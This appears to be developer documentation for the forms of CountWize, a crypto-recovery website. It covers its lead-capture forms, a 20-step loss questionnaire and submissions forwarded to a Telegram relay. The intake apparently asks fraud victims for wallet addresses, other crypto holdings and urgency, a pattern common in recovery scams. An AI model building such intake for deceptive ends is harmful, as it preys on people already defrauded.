# CountWize Forms and Inputs

This document details every form on the website, including all fields, validation rules, and submission handling.

---

## Forms Overview

| Form | Location | Purpose | Complexity |
|------|----------|---------|------------|
| Hero Form | index.html | Quick lead capture | Medium |
| Contact Form | contact-us.html | Detailed inquiries | High |
| Recovery Questionnaire | recovery-questionnaire.html | Case intake | Very High |
| Service Inquiry | detail_service.html | Service questions | Low |
| Password Form | 401.html | Access control | Low |

---

## 1. Hero Form (Homepage)

**Location:** `/index.html`
**Form ID:** `email-form`
**Form Name:** `email-form`
**Method:** POST
**Class:** `hero-form`

### Fields

| Field Name | Type | Placeholder | Required | Max Length |
|------------|------|-------------|----------|------------|
| First-Name | text | Enter Your Name | Yes | 256 |
| Last-Name | text | Enter Your Last Name | Yes | 256 |
| Email | email | Email Address | Yes | 256 |
| Phone | tel | Phone Number | Yes | 256 |
| Investment | text | Your Investment | Yes | 256 |
| Your-Problem | text | Your Problem | Yes | 256 |
| dialCode | hidden | - | No | - |

### Validation

- **Email:** HTML5 email type validation
- **Phone:** intl-tel-input library validation
  - Auto-detects country via ipapi.co
  - Validates format per country rules
  - Extracts dial code to hidden field

### Submit Button

- Text: "Send Message"
- Class: `submit-button-2`
- Includes SVG arrow icon

### Success/Error States

```html
<div class="w-form-done">Sent successfully!</div>
<div class="w-form-fail">Oops! Something went wrong...</div>
```

---

## 2. Contact Form (Contact Page)

**Location:** `/contact-us.html` and `/contact.html`
**Form ID:** `contact-form`
**Form Name:** `wf-form-contact-form`
**Method:** POST
**Class:** `contact-page-form`

### Fields

| Field Name | Type | ID | Placeholder | Required | Max Length |
|------------|------|-----|-------------|----------|------------|
| Sphere | hidden text | sphere-input | - | Yes | 256 |
| Full-Name | text | Full-Name | Enter Your Name | Yes | 256 |
| Email | email | Email | Email Address | Yes | 256 |
| Phone | tel | Phone | Phone Number | Yes | 256 |
| Message-Subject | text | Message-Subject | Message Subject | Yes | 256 |
| Invested-Amount | text | investment-input | Enter the amount | No | 256 |
| Desired-Specialist | text | specialist-input | Enter specialist name | No | 256 |
| Country | select | country-input | Select country | Yes | - |
| Town | select | town-input | Select town | Yes | - |
| Message | textarea | Message | Your Message | Yes | 5000 |
| dialCode | hidden | .dialCode | - | No | - |

### Dynamic Field Loading

**Country Dropdown:**
```javascript
// Loaded from API
fetch('https://countwiseapi.space/api/countries/')
  .then(response => response.json())
  .then(data => {
    // Populates country select
    // Each option has data-code attribute for flag emoji
  });
```

**City Dropdown:**
```javascript
// Triggered when country changes
fetch(`https://countwiseapi.space/api/countries/${countryId}/cities/`)
  .then(response => response.json())
  .then(data => {
    // Populates town select based on selected country
  });
```

### Phone Validation

```javascript
const iti = intlTelInput(input, {
  initialCountry: userCountry, // Auto-detected via IP
  placeholderNumberType: 'FIXED_LINE',
  separateDialCode: true,
  utilsScript: "intl-tel-input utils.min.js"
});

// Error codes
const errorMap = [
  "Invalid number",
  "Invalid country code",
  "Too short",
  "Too long",
  "Invalid number"
];

// Validation on blur
input.addEventListener('blur', function() {
  if (input.value.trim()) {
    if (iti.isValidNumber()) {
      // Valid - green border
    } else {
      // Invalid - red border + error message
    }
  }
});
```

### Form Submission

**Endpoint:** `https://telegram-vercel-seven.vercel.app/api/telegram`

**Request Format:**
```javascript
{
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    message: formattedMessage,
    files: base64EncodedFiles
  })
}
```

**Message Format:**
```
🇺🇸 New Contact Form Submission

📝 Contact Details:
• Name: John Doe
• Email: john@example.com
• Phone: +1 555-123-4567
• Subject: Lost Bitcoin

💼 Investment Info:
• Amount: $50,000
• Specialist: Recovery Expert

📍 Location:
• Country: United States
• City: New York

💬 Message:
I need help recovering my lost Bitcoin...
```

---

## 3. Recovery Questionnaire (20-Step Form)

**Location:** `/recovery-questionnaire.html`
**Form ID:** `webflow-form`
**Form Name:** `wf-form-Quiz-2`
**Method:** POST
**Class:** `form-2`

### Step-by-Step Breakdown

#### Step 0: Start Screen
- Title: "Start Your Crypto Recovery Process Today!"
- "Start" button to begin

#### Step 1: What Happened?
**Type:** Radio buttons
**Name:** `What-Happened`
**Required:** Yes

| Option | Value |
|--------|-------|
| Sent to the wrong address | Sent to the wrong address |
| Wallet hacked | Wallet hacked |
| Exchange scam / rug pull | Exchange scam / rug pull |
| Forgot private keys / seed phrase | Forgot private keys / seed phrase |
| Other (please explain) | Other |

**Conditional Field:**
- `What-Happened-other` (text, max 256)
- Shows when "Other" is selected

#### Step 2: How Much Crypto Was Lost?
**Type:** Radio buttons
**Name:** `How-Much-Crypto-Was-Lost`
**Required:** Yes

| Option | Value |
|--------|-------|
| Less than $1,000 | Less than $1,000 |
| $1,000 - $10,000 | $1,000 - $10,000 |
| $10,000 - $50,000 | $10,000 - $50,000 |
| $50,000+ | $50,000+ |
| Custom amount | Custom amount |

**Conditional Field:**
- `How-Much-Crypto-Was-Lost-other` (text, max 256)
- Shows when "Custom amount" is selected

#### Step 3: Which Cryptocurrency Was Lost?
**Type:** Radio buttons
**Name:** `Which-Cryptocurrency-Was-Lost`
**Required:** Yes

| Option | Value |
|--------|-------|
| Bitcoin (BTC) | Bitcoin (BTC) |
| Ethereum (ETH) | Ethereum (ETH) |
| USDT (Tether) | USDT (Tether) |
| Binance Coin (BNB) | Binance Coin (BNB) |
| Other (please specify) | Other |

**Conditional Field:**
- `Which-Cryptocurrency-Was-Lost-other` (text, max 256)

#### Step 4: When Did This Happen?
**Type:** Radio buttons
**Name:** `When-Did-This-Happen`
**Required:** Yes

| Option | Value |
|--------|-------|
| Today | Today |
| Within the last week | Within the last week |
| Within the last month | Within the last month |
| 1-3 months ago | 1-3 months ago |
| Over 3 months ago | Over 3 months ago |

#### Step 5: Recipient Wallet Address
**Type:** Text input
**Name:** `To-Which-Wallet-Address-Was-the-Crypto-Sent`
**Placeholder:** "Wallet address"
**Required:** No (Skip button available)
**Max Length:** 256

#### Step 6: Your Wallet Address
**Type:** Text input
**Name:** `What-Was-Your-Own-Wallet-Address`
**Placeholder:** "Wallet address"
**Required:** No (Skip button available)
**Max Length:** 256

#### Step 7: Which Wallet Did You Use?
**Type:** Radio buttons
**Name:** `Which-Wallet-Did-You-Use`
**Required:** Yes

| Option | Value |
|--------|-------|
| MetaMask | MetaMask |
| Trust Wallet | Trust Wallet |
| Ledger / Trezor (Hardware Wallet) | Ledger / Trezor |
| Exchange Wallet | Exchange Wallet |
| Other (please specify) | Other |

**Conditional Field:**
- `Which-Wallet-Did-You-Use-other` (text, max 256)

#### Step 8: Where Did You Buy This Crypto?
**Type:** Radio buttons
**Name:** `Where-Did-You-Buy-This-Crypto`
**Required:** Yes

| Option | Value |
|--------|-------|
| Binance | Binance |
| Coinbase | Coinbase |
| Kraken | Kraken |
| KuCoin | KuCoin |
| Other (please specify) | Other |

**Conditional Field:**
- `Where-Did-You-Buy-This-Crypto-other` (text, max 256)

#### Step 9: Exchange Type
**Type:** Radio buttons
**Name:** `Did-You-Use-a-Centralized-or-Decentralized-Exchange`
**Required:** Yes

| Option | Value |
|--------|-------|
| Centralized (e.g., Binance, Coinbase) | Centralized |
| Decentralized (e.g., Uniswap, PancakeSwap) | Decentralized |

#### Step 10: Wallet Access
**Type:** Radio buttons
**Name:** `Do-You-Still-Have-Access-to-Your-Wallet`
**Required:** Yes

| Option | Value |
|--------|-------|
| Yes, I can access it | Yes |
| No, I lost access | No |

#### Step 11: Contacted Provider?
**Type:** Radio buttons
**Name:** `Have-You-Contacted-the-Exchange-or-Wallet-Provider`
**Required:** Yes

| Option | Value |
|--------|-------|
| Yes, but no response | Yes, no response |
| Yes, they said they can't help | Yes, can't help |
| No, I haven't contacted them yet | No |

#### Step 12: Transaction Proof (File Upload)
**Type:** File input (multiple)
**Name:** `file0`, `file1`, `file2`
**Required:** No (Skip button available)
**Max Files:** 3
**Accepted:** `image/*, .pdf, .doc, .docx`

**JavaScript Implementation:**
```javascript
const maxUploads = 3;
let uploadCount = 0;

function createUploadField() {
  if (uploadCount >= maxUploads) return;

  const input = document.createElement("input");
  input.type = "file";
  input.accept = "image/*,.pdf,.doc,.docx";
  input.name = "file" + uploadCount;

  input.addEventListener("change", function() {
    // Show preview
    // Increment counter
    // Create next field if under max
  });
}
```

#### Step 13: Scam/Fraud Case?
**Type:** Radio buttons
**Name:** `Was-This-a-Scam-or-Fraud-Case`
**Required:** Yes

| Option | Value |
|--------|-------|
| Yes, I was scammed | Yes |
| No, this was a mistake | No |
| Not sure | Not sure |

#### Step 14: Reported to Authorities?
**Type:** Radio buttons
**Name:** `Has-This-Been-Reported-to-Authorities`
**Required:** Yes

| Option | Value |
|--------|-------|
| Yes, with law enforcement | Yes |
| No, not yet | No |
| I need guidance on reporting | Need guidance |

#### Step 15: Urgency Level
**Type:** Radio buttons (styled as scale 1-5)
**Name:** `How-Urgent-Is-This-Case`
**Required:** Yes

Options: 1, 2, 3, 4, 5

#### Step 16: Own Other Crypto?
**Type:** Radio buttons
**Name:** `Do-You-Own-Other-Crypto-Assets`
**Required:** Yes

| Option | Value |
|--------|-------|
| Less than $1,000 | Less than $1,000 |
| $1,000 - $10,000 | $1,000 - $10,000 |
| $10,000 - $50,000 | $10,000 - $50,000 |
| $50,000+ | $50,000+ |

#### Step 17: Security Measures?
**Type:** Radio buttons
**Name:** `Are-You-Open-to-Additional-Security-Measures`
**Required:** Yes

| Option | Value |
|--------|-------|
| Yes, I need security advice | Yes |
| No, just recovery | No |

#### Step 18: Country Selection
**Type:** Select dropdown
**Name:** `Country`
**Required:** Yes
**Data Source:** restcountries.com API

#### Step 19: Contact Information
**Fields:**

| Name | Type | Placeholder | Required |
|------|------|-------------|----------|
| Name | text | Your name... | Yes |
| Email | email | Email address... | Yes |
| Phone | tel | Number... | Yes |
| id-case | hidden | - | Yes (auto-filled) |

**Consultation Question:**
**Name:** `consultation`
**Type:** Radio
**Options:** yes, no
**Shows:** Only when email AND phone are filled

#### Step 20: Schedule Call (Conditional)
**Shows:** Only if consultation = "yes"

**Fields:**

| Name | Type | Purpose |
|------|------|---------|
| call-datetime | hidden | Stores date/time value |
| timezone | select | User's timezone |
| contact-method | radio | WhatsApp or Phone call |

**Date Picker:** Flatpickr library
- Enables date and time selection
- Inline display
- Time format: 24h

---

### Progress Bar

```javascript
function showStep(index) {
  const progress = Math.round((index + 1) / steps.length * 100);
  progressBar.style.width = progress + "%";
}
```

### Navigation Buttons

| Button | Class | Behavior |
|--------|-------|----------|
| Back | `.back-button` | Go to previous step |
| Next | `.next-button` | Go to next step (auto-enabled on selection) |
| Skip | `.skip-button` | Skip optional steps (5, 6, 12) |
| Submit | Submit button | Final form submission |

### Case ID Generation

```javascript
function generateCaseID() {
  const caseID = Math.floor(10000 + Math.random() * 90000).toString();
  // Returns 5-digit number like "48392"
  // Displayed as "CW-48392"
}
```

### Form Submission

**Same endpoint as contact form:**
`https://telegram-vercel-seven.vercel.app/api/telegram`

**Message Sections:**
1. 🧾 What happened
2. 💰 Loss of cryptocurrency
3. 🕒 Time and addresses
4. 👛 Wallet
5. 🏦 Exchange
6. 🔐 Security
7. 📞 Contact details

---

## 4. Service Inquiry Form

**Location:** `/detail_service.html`
**Form ID:** `email-form`
**Method:** POST
**Class:** `service-form`

### Fields

| Field Name | Type | Placeholder | Required | Max Length |
|------------|------|-------------|----------|------------|
| name | text | Enter your name | Yes | 256 |
| Phone | tel | Enter your number | Yes | 256 |
| Email | email | Enter your e-mail | Yes | 256 |

### Submit Button
- Text: "Contact us"
- Class: `button w-button`

---

## 5. Password Protection Form

**Location:** `/401.html`
**Form ID:** `email-form`
**Method:** POST
**Action:** `/.wf_auth`
**Class:** `utility-page-form w-password-page`

### Fields

| Field Name | Type | Placeholder |
|------------|------|-------------|
| pass | password | Enter your password |
| path | hidden | Page path |
| page | hidden | Page identifier |

**Error Handling:**
- Checks URL for `?e=1` parameter
- Shows "Incorrect password. Please try again."

---

## Validation Summary

### Email Validation
```javascript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

### Phone Validation (intl-tel-input)
```javascript
// Error codes
0: "Invalid number"
1: "Invalid country code"
2: "Too short"
3: "Too long"
4: "Invalid number"

// Allowed characters
/[0-9\+\-\(\)\s]/
```

### Visual Feedback
- **Valid:** Green border (`#a3dcad`)
- **Invalid:** Red border + error message (`#ff4d4f`)
- **Focus:** Green glow outline
